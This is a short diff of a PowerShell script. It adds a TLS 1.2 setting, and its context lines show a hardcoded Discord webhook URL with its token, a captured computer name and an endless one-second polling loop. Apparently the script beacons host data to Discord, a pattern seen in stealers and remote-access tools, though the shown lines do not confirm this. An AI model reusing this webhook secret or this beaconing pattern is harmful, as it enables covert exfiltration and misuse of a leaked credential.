@@ -1,3 +1,5 @@
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
 $webhookUrl = "https://discord.com/api/webhooks/1479995689961263144/3RALIyHNYENG0aG9Hj8T2bJB53QNgcdTAiT3H9dHttiqCOgqK2TZ4OXq2cH9nz0hyzoP"
 
 $pcName     = $env:COMPUTERNAME
@@ -82,3 +84,4 @@ while ($true) {
 
     Start-Sleep -Seconds 1
 }
+
